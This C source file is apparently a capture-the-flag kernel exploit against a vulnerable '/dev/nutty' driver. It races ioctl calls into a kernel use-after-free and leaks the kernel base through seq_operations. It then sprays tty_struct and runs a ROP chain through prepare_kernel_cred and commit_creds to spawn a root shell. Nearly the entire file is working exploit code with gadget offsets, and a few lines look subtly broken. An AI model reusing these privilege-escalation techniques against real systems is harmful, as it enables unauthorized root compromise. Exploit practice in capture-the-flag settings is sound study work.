#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <assert.h>
#include <stdlib.h>
#include <signal.h>
#include <poll.h>
#include <pthread.h>
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/userfaultfd.h>
#include <sys/syscall.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/shm.h>


// commands
#define DEV_PATH "/dev/nutty"   // the path the device is placed

// constants
#define PAGE 0x1000
#define FAULT_ADDR 0xdead0000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4*PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
// (END constants)

// globals
// (END globals)


// utils
#define WAIT getc(stdin);
#define ulong unsigned long
#define scu static const unsigned long
#define NULL (void*)0
#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)
#define KMALLOC(qid, msgbuf, N) for(int ix=0; ix!=N; ++ix){\
                        if(msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) errExit("KMALLOC");}
ulong user_cs,user_ss,user_sp,user_rflags;
struct pt_regs {
	ulong r15; ulong r14; ulong r13; ulong r12; ulong bp;
	ulong bx;  ulong r11; ulong r10; ulong r9; ulong r8;
	ulong ax; ulong cx; ulong dx; ulong si; ulong di;
	ulong orig_ax; ulong ip; ulong cs; ulong flags;
  ulong sp; ulong ss;
};
void print_regs(struct pt_regs *regs)
{
  printf("r15: %lx r14: %lx r13: %lx r12: %lx\n", regs->r15, regs->r14, regs->r13, regs->r12);
  printf("bp: %lx bx: %lx r11: %lx r10: %lx\n", regs->bp, regs->bx, regs->r11, regs->r10);
  printf("r9: %lx r8: %lx ax: %lx cx: %lx\n", regs->r9, regs->r8, regs->ax, regs->cx);
  printf("dx: %lx si: %lx di: %lx ip: %lx\n", regs->dx, regs->si, regs->di, regs->ip);
  printf("cs: %lx flags: %lx sp: %lx ss: %lx\n", regs->cs, regs->flags, regs->sp, regs->ss);
}
void NIRUGIRI(void)
{
  puts("[!!!] REACHED NIRUGIRI");
  int ruid, euid, suid;
  getresuid(&ruid, &euid, &suid);
  //if(euid != 0)
  //  errExit("[ERROR] FAIL");
  system("/bin/sh");
  //char *argv[] = {"/bin/sh",NULL};
  //char *envp[] = {NULL};
  //execve("/bin/sh",argv,envp);
}
// should compile with -masm=intel
static void save_state(void) {
  asm(
      "movq %0, %%cs\n"
      "movq %1, %%ss\n"
      "movq %2, %%rsp\n"
      "pushfq\n"
      "popq %3\n"
      : "=r" (user_cs), "=r" (user_ss), "=r"(user_sp), "=r" (user_rflags) : : "memory" 		);
}

static void shellcode(void){
  asm(
    "xor rdi, rdi\n"
    "mov rbx, QWORD PTR [rsp+0x50]\n"
    "sub rbx, 0x244566\n"
    "mov rcx, rbx\n"
    "call rcx\n"
    "mov rdi, rax\n"
    "sub rbx, 0x470\n"
    "call rbx\n"
    "add rsp, 0x20\n"
    "pop rbx\n"
    "pop r12\n"
    "pop r13\n"
    "pop r14\n"
    "pop r15\n"
    "pop rbp\n"
    "ret\n"
  );
}
// (END utils)

/** nutty **/
// commands
#define NUT_CREATE 0x13371
#define NUT_DELETE 0x13372
#define NUT_SHOW 0x13373
#define NUT_APPEND 0x13374

// type
struct req {
    int idx;
    int size;
    char* contents;
    int content_length;
    char* show_buffer;
};

// globals
int nutfd;
char buf[0x400];            // general shared buf between threads in userland
ulong kernbase;
uint second_size = 0x2e0;   // second nut size
ulong *chain = 0;           // ROP chain
int leaked = -1;
uint count = 0;             // just counters
ulong total_try = 0;
ulong delete_count = 0;
ulong append_count = 0;
uint target_idx = 0;
ulong current_cred;

// wrappers
int _create(int fd, uint size, uint csize, char *data){
  //printf("[+] create: %lx, %lx, %p\n", size, csize, data);
  assert(fd > 0);
  assert(0<=size && size<0x400);
  assert(csize > 0);
  assert(count < 10);
  struct req myreq = {
    .size = size,
    .content_length = csize,
    .contents = data
  };
  return ioctl(fd, NUT_CREATE, &myreq);
}

int _show(int fd, uint idx, char *buf){
  //printf("[+] show: %lx, %p\n", idx, buf);
  assert(fd > 0);
  struct req myreq ={
    .idx = idx,
    .show_buffer = buf
  };
  return ioctl(fd, NUT_SHOW, &myreq);
}

int _delete(int fd, uint idx){
  //printf("[+] delete: %x\n", idx);
  assert(fd > 0);
  struct req myreq = {
    .idx = idx,
  };
  return ioctl(fd, NUT_DELETE, &myreq);
}

int _append(int fd, uint idx, uint size, uint csize, char *data){
  //printf("[+] append: %x, %x %x, %p\n", idx, size, csize, data);
  assert(fd > 0);
  assert(0<=size && size<0x400);
  assert(csize > 0);
  struct req myreq = {
    .size = size,
    .content_length = csize,
    .contents = data,
    .idx = idx
  };
  return ioctl(fd, NUT_APPEND, &myreq);
}
/** (END nutty) **/

// thread handlers
static void* shower(void *arg){
  char rbuf[0x200];
  memset(rbuf, 0, 0x200);
  int result;
  int tmpfd;
  ulong shower_counter = 0;
  while(leaked == -1){
    // alloc seq_operations in case kUAF is realized
    tmpfd = open("/proc/self/stat", O_RDONLY);
    result = _show(nutfd, 0, rbuf);
    if(result < 0){ // not existance
      close(tmpfd);
      continue;
    }
    // if the value of nut is not AAAAAA..., kUAF is realized and seq_operations is there
    if(((ulong*)rbuf)[0] != 0x4141414141414141){
      leaked = 1;
      puts("[!] LEAKED!");
      for(int ix=0; ix!=4;++ix){
        printf("[!] 0x%lx\n", ((ulong*)rbuf)[ix]);
      }
      break;
    }
    // kfree seq_operations (if you forget, it leads to out of memory and system crash)
    close(tmpfd);
    if(shower_counter % 0x1000 == 0){
      printf("[-] shower: 0x%lx, 0x%lx\n", shower_counter, ((ulong*)rbuf)[0]);
    }
    ++shower_counter;
  }
  puts("[+] shower returning...");
  return (void*)((ulong*)rbuf)[0];
}

static void* appender(void *arg){
  int result = 0;
  char wbuf[0x200];
  memset(wbuf, 'A', 0x200);
  while(leaked == -1){
    result = _append(nutfd, target_idx, 0x0, 0x1, wbuf);
    if(result >= 0){
      ++append_count;
      if(append_count % 0x100 == 0)
        printf("[-] append: 0x%lx\n", append_count);
    }
  }
  puts("[+] appender returning...");
}

static void* writer(void *arg){
  char rbuf[0x400];
  int result;
  int tmpfd;
  ulong writer_counter = 0;

  while(leaked == -1){
    // alloc tty_struct in case kUAF is realized
    tmpfd = open("/dev/ptmx", O_RDWR | O_NOCTTY);
    result = _show(nutfd, target_idx, rbuf);
    if(result < 0){ // idx0が存在しなy
      close(tmpfd);
      continue;
    }
    // if the value of nut is not AAAAAA..., kUAF is realized and seq_operations is there
    if(((ulong*)rbuf)[0] != 0x4242424242424242){
      leaked = 1;
      // do my businness first
      _delete(nutfd, target_idx);

      // gen chain
      chain = (ulong*)((ulong)rbuf + 8);
      *chain++ = kernbase + 0x14ED59;           // pop rdi, pop rsi // MUST two pops to remove necessary pointers in tty_struct
      *chain++ = ((ulong*)rbuf)[2];             // this musn't be collappsed
      *chain++ = ((ulong*)rbuf)[7] & ~0xFFFUL;  // this musn't be collappsed

      *chain++ = kernbase + 0x001BDD; // 0xffffffff81001bdd: pop rdi ; ret  ;  (6917 found)
      *chain++ = 0;
      *chain++ = kernbase + 0x08C3C0; // prepare_kernel_cred
      *chain++ = kernbase + 0x0557B5; // pop rcx
      *chain++ = 0;
      *chain++ = kernbase + 0xA2474B; // mov rdi, rax, rep movsq
      *chain++ = kernbase + 0x08C190; // commit_creds

      *chain++ = kernbase + 0x0557b5; // pop rcx
      *chain++ = kernbase + 0x00CF31; // [starter] leave

      *chain++ = kernbase + 0xc00e06; // swapgs 0xffffffff81c00e26 mov rdi,cr3 (swapgs_restore_regs_and_return_to_usermode)

      *chain++ = 0xEEEEEEEEEEEEEEEE   // dummy
      *chain++ = kernbase + 0x0AD147; // 0xffffffff81026a7b: 48 cf iretq
      *chain++ = &NIRUGIRI;
      *chain++ = user_cs;
      *chain++ = user_rflags;
      *chain++ = user_sp;
      *chain++ = user_ss;

      assert(setxattr("/home/user/exploit", "NIRUGIRI", rbuf, second_size, XATTR_CREATE));
      ioctl(tmpfd, 0, 0x13371337);

      assert(tmpfd > 0);
      return; // unreacable
    }
    close(tmpfd);
    if(writer_counter % 0x1000 == 0){
      printf("[-] writer: 0x%lx, 0x%lx\n", writer_counter, ((ulong*)rbuf)[0]);
    }
    ++writer_counter;
  }
  puts("[+] writer returning...");
  return 0;
}

struct _msgbuf{
  long mtype;
  char mtext[0x30];
};
struct _msgbuf2e0{
  long mtype;
  char mtext[0x2e0];
};

int main(int argc, char *argv[]) {
  pthread_t creater_thr, deleter_thr, shower_thr, appender_thr, cad_thr, cder_thr, writer_thr;
  char rbuf[0x400];
  printf("[+] NIRUGIRI @ %p\n", &NIRUGIRI);
  memset(rbuf, 0, 0x200);
  memset(buf, 'A', 0x200);
  nutfd = open(DEV_PATH, O_RDWR);
  assert(nutfd > 0);
  int qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
  if(qid == -1) errExit("msgget");
  struct _msgbuf msgbuf = {.mtype = 1};
  struct _msgbuf2e0 msgbuf2e0 = {.mtype = 2};
  KMALLOC(qid, msgbuf2e0, 0x5);

  // leak kernbase
  _create(nutfd, 0x20, 0x20, buf);
  int appender_fd = pthread_create(&appender_thr, NULL, appender , 0);
  if(appender_fd > 0)
    errExit("appender_fd");
  int shower_fd = pthread_create(&shower_thr, NULL, shower, 0);
  if(shower_fd > 0)
    errExit("shower_fd");
  void *ret_shower;
  pthread_join(appender_thr, 0);
  pthread_join(shower_thr, &ret_shower);
  const ulong single_start = (ulong)ret_shower;
  kernbase = single_start - 0x1FA9E0;
  printf("[!] kernbase: 0x%lx\n", kernbase);

  // <until here, there is NO corruption //
  leaked = -1;
  target_idx = 1;
  memset(buf, 'B', 0x200);
  for(int ix=1; ix!=0x30; ++ix){
    ((ulong*)buf)[ix] = 0xdead00000 + ix*0x1000;
  }
  printf("[+] starting point: 0x%lx\n", kernbase + 0x00CF31);
  ((ulong*)buf)[0x60/8] = kernbase + 0x00CF31;

  _create(nutfd, second_size, second_size, buf);
  _create(nutfd, 0x2e0, 0x2e0, buf);

  save_state();
  appender_fd = pthread_create(&appender_thr, NULL, appender , 0);
  if(appender_fd > 0)
    errExit("appender_fd");
  int writer_fd = pthread_create(&writer_thr, NULL, writer, 0);
  if(writer_fd > 0)
    errExit("writer_fd");
  pthread_join(appender_thr, 0);
  pthread_join(writer_thr, 0);

  NIRUGIRI(); // unreachable
  return 0;
}

